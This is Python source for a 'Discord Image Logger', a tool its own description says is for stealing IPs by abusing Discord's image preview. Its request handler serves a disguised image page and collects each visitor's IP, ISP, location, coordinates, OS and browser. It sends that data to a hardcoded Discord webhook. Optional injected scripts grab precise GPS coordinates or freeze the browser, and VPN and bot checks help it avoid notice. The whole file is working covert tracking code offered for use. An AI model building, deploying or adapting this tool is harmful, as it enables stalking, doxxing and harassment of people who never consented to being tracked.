# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1129314010286805113/Np1vhhB9PfoZPYlxwEaMXsPBrBKRPmRBOpYgrqt0sifz2yKszCQP9TbsH2yzKmpzUVOp",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
